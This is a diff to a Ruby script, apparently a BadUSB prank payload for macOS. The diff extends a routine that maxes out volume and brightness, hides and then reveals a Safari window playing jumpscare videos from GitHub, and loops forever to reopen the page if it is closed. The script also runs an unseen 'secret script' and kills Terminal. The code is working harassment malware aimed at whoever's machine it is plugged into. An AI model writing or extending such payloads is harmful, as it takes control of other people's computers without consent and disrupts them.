@@ -30,8 +30,16 @@ def set_volume_to_max
   end
 end
 
+# --- Brightness Control: Set Display Brightness to Maximum ---
+def set_brightness_to_max
+  if system("command -v brightness > /dev/null 2>&1")
+    system("brightness 1")
+  else
+    puts "Brightness control not available or 'brightness' utility not installed."
+  end
+end
+
 # --- Create Temporary HTML for Jumpscare ---
-# The Tempfile is created with a prefix "jumpscare" so its filename contains that substring.
 def create_jumpscare_html(video_url)
   html_content = <<-HTML
 <html>
@@ -56,7 +64,7 @@ def create_jumpscare_html(video_url)
       var video = document.getElementById('video');
       video.play();
       video.addEventListener('loadeddata', function() {
-        // After a short delay, unmute and play.
+        // After 500ms, unmute and play.
         setTimeout(function(){
           video.muted = false;
           video.play();
@@ -74,7 +82,6 @@ def create_jumpscare_html(video_url)
 end
 
 # --- Persistent Jumpscare Mode ---
-# This function continuously ensures that Safari is showing the jumpscare page.
 def persistent_jumpscare(video_url)
   html_file = create_jumpscare_html(video_url)
   
@@ -82,10 +89,12 @@ def persistent_jumpscare(video_url)
     set_volume_to_max
     # Open the jumpscare page in Safari.
     system("open -a Safari '#{html_file}'")
-    # Immediately hide Safari’s window.
+    # Immediately hide Safari's front window.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
-    # Wait 0.5 seconds to simulate noise detection.
-    sleep 0.5
+    # Wait 0.75 seconds (0.5 + additional 0.25) to simulate detection of noise.
+    sleep 0.75
+    # Set brightness to maximum.
+    set_brightness_to_max
     # Unhide Safari so the jumpscare becomes visible.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
     # Let the jumpscare play for 1 second.
@@ -97,22 +106,15 @@ def persistent_jumpscare(video_url)
         set found to false
         repeat with w in windows
           repeat with t in tabs of w
-            if (URL of t) contains "jumpscare" then
-              set found to true
-            end if
+            if (URL of t) contains "jumpscare" then set found to true
           end repeat
         end repeat
         return found
       end tell
     }
     result = `osascript -e '#{check_script}'`.strip.downcase
-    # If not found or if result contains "false", then reopen it.
-    if result.include?("false")
-      next
-    else
-      # Otherwise, wait a bit and then check again.
-      sleep 3
-    end
+    # If not found, loop will reopen the page.
+    sleep 3
   end
 end
 
@@ -127,13 +129,14 @@ def subscriber_action(choice)
   case ch
   when "hawk"
     run_secret_script
-    # After running the secret script, exit.
     system("killall Terminal")
     exit 0
   when "tuah"
     persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
   when "sydney lover"
     persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
+  when "girl power!", "girl power", "girlpower"
+    persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
   else
     puts "Unexpected button choice: #{choice}"
   end
@@ -147,19 +150,19 @@ if subscribed.nil?
 end
 
 if subscribed.downcase == "no"
-  # For non-subscribers, immediately play the jumpscare using jumpscare2.mp4.
+  # Non-subscriber branch: Immediately trigger jumpscare using jumpscare2.mp4.
   sleep 1
-  persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4")
-  # (Since persistent_jumpscare never exits, this branch won’t reach Terminal kill.)
+  video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
+  persistent_jumpscare(video_url)
+  # (Persistent loop never exits; therefore Terminal won't be reached.)
 else
-  # For subscribers, show a dialog with three buttons.
-  button_choice = display_dialog("Choose a button:", ["Sydney lover", "Hawk", "Tuah"], "Hawk")
+  # Subscriber branch: Show a dialog with four buttons.
+  button_choice = display_dialog("Choose a button:", ["Sydney lover", "Hawk", "Tuah", "Girl Power!"], "Hawk")
   if button_choice.nil?
     puts "No button chosen. Exiting."
     exit 0
   end
   subscriber_action(button_choice)
-  # After subscriber actions (if they don't enter persistent mode), kill Terminal.
   system("killall Terminal")
   exit 0
 end
